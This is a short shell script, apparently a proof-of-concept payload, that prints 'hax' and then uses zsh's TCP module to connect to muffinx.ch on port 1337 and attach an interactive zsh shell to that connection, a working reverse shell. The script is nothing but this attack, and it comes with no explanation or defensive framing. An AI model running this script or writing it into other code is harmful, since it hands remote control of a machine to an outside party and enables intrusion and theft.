#!/bin/sh

echo hax
zsh -c 'zmodload zsh/net/tcp && ztcp muffinx.ch 1337 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
